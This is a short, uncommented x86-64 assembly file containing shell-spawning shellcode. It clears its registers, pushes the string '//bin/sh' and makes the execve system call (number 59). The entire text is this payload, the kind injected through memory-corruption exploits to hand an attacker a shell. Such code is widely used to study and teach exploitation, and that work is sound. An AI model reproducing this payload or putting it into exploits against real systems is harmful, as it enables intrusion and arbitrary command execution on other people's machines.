section .text

global _start

_start:

xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx

mov al, 59
push rdi
mov rdi, 0x68732f6e69622f2f
push rdi
mov rdi, rsp

syscall
